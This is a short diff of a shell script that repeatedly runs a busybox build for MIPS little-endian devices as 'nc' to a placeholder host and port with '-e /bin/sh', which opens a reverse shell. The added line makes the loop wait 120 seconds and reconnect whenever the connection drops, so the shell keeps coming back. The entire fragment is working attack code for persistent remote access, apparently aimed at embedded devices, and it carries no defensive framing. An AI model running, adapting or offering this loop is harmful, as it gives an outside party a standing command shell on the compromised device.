@@ -13,4 +13,5 @@ chmod +x busybox-mipsel
 while true;
 do 
     ./busybox-mipsel nc dest-ip-to-connect port-to-connect -e /bin/sh
+    sleep 120     #if connection fails reconnect after 120 seconds
 done
